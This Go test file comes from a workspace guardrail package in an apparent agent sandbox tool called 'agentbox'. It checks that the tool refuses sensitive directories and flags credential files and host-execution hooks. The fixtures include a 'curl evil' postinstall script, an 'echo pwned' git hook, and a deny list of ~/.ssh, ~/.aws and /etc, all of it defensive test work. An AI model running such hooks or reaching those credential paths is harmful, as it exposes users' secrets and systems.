package workspace

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestCanonicalResolvesSymlinks(t *testing.T) {
	root := t.TempDir()
	real := filepath.Join(root, "real")
	if err := os.Mkdir(real, 0o755); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(root, "link")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	got, err := Canonical(link)
	if err != nil {
		t.Fatalf("Canonical: %v", err)
	}
	if got != real {
		t.Errorf("Canonical(%q) = %q, want %q", link, got, real)
	}
	// Relative paths become absolute.
	wd, _ := os.Getwd()
	got, err = Canonical(".")
	if err != nil || got != wd {
		t.Errorf("Canonical(.) = %q, %v; want %q", got, err, wd)
	}
}

func TestValidateMissingPath(t *testing.T) {
	err := Validate(filepath.Join(t.TempDir(), "nope"), Options{Home: "/home/x"})
	if err == nil {
		t.Fatal("expected error for missing workspace")
	}
	msg := err.(*Error).Render()
	if !strings.Contains(msg, "does not exist") {
		t.Errorf("msg = %q", msg)
	}
	if !strings.Contains(msg, "current directory") {
		t.Errorf("remedy missing: %q", msg)
	}
}

func TestValidateNotADirectory(t *testing.T) {
	f := filepath.Join(t.TempDir(), "file.txt")
	os.WriteFile(f, []byte("x"), 0o644)
	err := Validate(f, Options{Home: "/home/x"})
	if err == nil || !strings.Contains(err.Error(), "not a directory") {
		t.Errorf("err = %v", err)
	}
}

func TestGuardrailRefusals(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home", "mark")
	os.MkdirAll(filepath.Join(home, ".ssh"), 0o700)
	os.MkdirAll(filepath.Join(home, ".aws"), 0o700)
	os.MkdirAll(filepath.Join(home, ".config"), 0o700)
	os.MkdirAll(filepath.Join(home, ".gnupg"), 0o700)
	os.MkdirAll(filepath.Join(home, ".docker"), 0o700)
	os.MkdirAll(filepath.Join(home, "src", "app"), 0o755)

	for _, path := range []string{
		"/",
		home,
		filepath.Join(root, "home"), // ancestor of home
		filepath.Join(home, ".ssh"),
		filepath.Join(home, ".ssh", "sub"),
		home + "/.aws",
		home + "/.config",
		home + "/.gnupg",
		home + "/.docker",
		"/etc",
		"/etc/nginx",
		"/var/run",
		"/var/lib/docker",
	} {
		err := Validate(path, Options{Home: home})
		if err == nil {
			t.Errorf("Validate(%q) must refuse", path)
			continue
		}
		ge, ok := err.(*Error)
		if !ok {
			t.Errorf("Validate(%q): error type %T", path, err)
			continue
		}
		if !strings.Contains(ge.Render(), "--force") {
			t.Errorf("Validate(%q): refusal must mention --force: %q", path, ge.Render())
		}
	}
}

func TestGuardrailForceOverrides(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "mark")
	os.MkdirAll(home, 0o755)
	if err := Validate(home, Options{Home: home, Force: true}); err != nil {
		t.Errorf("--force must override the guardrail, got %v", err)
	}
}

func TestGuardrailAllowsNormalProject(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "mark")
	app := filepath.Join(home, "src", "app")
	os.MkdirAll(app, 0o755)
	if err := Validate(app, Options{Home: home}); err != nil {
		t.Errorf("normal project must pass: %v", err)
	}
	// A sibling directory is fine too.
	sib := filepath.Join(root, "other")
	os.MkdirAll(sib, 0o755)
	if err := Validate(sib, Options{Home: home}); err != nil {
		t.Errorf("sibling dir must pass: %v", err)
	}
}

func TestErrorRenderStyle(t *testing.T) {
	e := &Error{Msg: `workspace "/tmp/nope" does not exist`, Remedy: "check the path, or run agentbox with no argument to use the current directory"}
	got := e.Render()
	if !strings.HasPrefix(got, "agentbox: ") || !strings.Contains(got, "\n  \u2192 ") {
		t.Errorf("style = %q", got)
	}
	if !strings.HasSuffix(got, "\n") {
		t.Errorf("must end with newline: %q", got)
	}
}

func TestScanNoticesCredentialFiles(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, ".env"), []byte("A=1"), 0o600)
	os.WriteFile(filepath.Join(dir, ".netrc"), []byte("machine x"), 0o600)
	os.WriteFile(filepath.Join(dir, "credentials.json"), []byte("{}"), 0o600)
	os.WriteFile(filepath.Join(dir, "README.md"), []byte("hi"), 0o644)

	notices := Scan(dir)
	if len(notices) != 1 {
		t.Fatalf("want exactly one one-line notice, got %d: %v", len(notices), notices)
	}
	n := notices[0]
	for _, want := range []string{".env", ".netrc", "credentials.json", "docs/isolation.md", "--quiet"} {
		if !strings.Contains(n, want) {
			t.Errorf("notice %q missing %q", n, want)
		}
	}
	if strings.Contains(n, "README.md") {
		t.Errorf("notice must not flag README.md: %q", n)
	}
}

func TestScanNoticesHostExecutionVectors(t *testing.T) {
	dir := t.TempDir()
	hooks := filepath.Join(dir, ".git", "hooks")
	os.MkdirAll(hooks, 0o755)
	os.WriteFile(filepath.Join(hooks, "pre-commit"), []byte("#!/bin/sh\necho pwned"), 0o755)
	os.WriteFile(filepath.Join(hooks, "pre-commit.sample"), []byte("#!/bin/sh"), 0o755)
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"postinstall":"curl evil"}}`), 0o644)
	os.WriteFile(filepath.Join(dir, ".envrc"), []byte("export A=1"), 0o644)

	notices := Scan(dir)
	if len(notices) != 1 {
		t.Fatalf("want one notice, got %v", notices)
	}
	n := notices[0]
	for _, want := range []string{"pre-commit", "package.json", ".envrc"} {
		if !strings.Contains(n, want) {
			t.Errorf("notice %q missing %q", n, want)
		}
	}
	if strings.Contains(n, ".sample") {
		t.Errorf("notice must ignore *.sample hooks: %q", n)
	}
}

func TestScanNoticesCleanWorkspace(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main"), 0o644)
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"test":"go test"}}`), 0o644)
	if notices := Scan(dir); len(notices) != 0 {
		t.Errorf("clean workspace must have no notices: %v", notices)
	}
}

func TestScanIsBoundedToRootAndHooks(t *testing.T) {
	dir := t.TempDir()
	deep := filepath.Join(dir, "vendor", "nested")
	os.MkdirAll(deep, 0o755)
	os.WriteFile(filepath.Join(deep, ".env"), []byte("A=1"), 0o600)
	if notices := Scan(dir); len(notices) != 0 {
		t.Errorf("scan must not recurse: %v", notices)
	}
}

func TestSELinuxRelabelDetection(t *testing.T) {
	root := t.TempDir()
	if got := selinuxRelabelFrom(root); got != "" {
		t.Errorf("no /sys/fs/selinux => %q, want empty", got)
	}
	os.MkdirAll(filepath.Join(root, "sys", "fs", "selinux"), 0o755)
	os.WriteFile(filepath.Join(root, "sys", "fs", "selinux", "enforce"), []byte("1\n"), 0o644)
	if got := selinuxRelabelFrom(root); got != "z" {
		t.Errorf("enforcing => %q, want z", got)
	}
	os.WriteFile(filepath.Join(root, "sys", "fs", "selinux", "enforce"), []byte("0\n"), 0o644)
	if got := selinuxRelabelFrom(root); got != "" {
		t.Errorf("permissive => %q, want empty", got)
	}
}

func TestHash8(t *testing.T) {
	a := Hash8("/home/me/src/app")
	if len(a) != 8 || strings.ContainsAny(a, "g-zABCDEF") {
		t.Errorf("Hash8 = %q, want 8 lowercase hex", a)
	}
	if a != Hash8("/home/me/src/app") {
		t.Error("Hash8 must be deterministic")
	}
	if a == Hash8("/home/me/src/other") {
		t.Error("Hash8 must differ for different paths")
	}
}
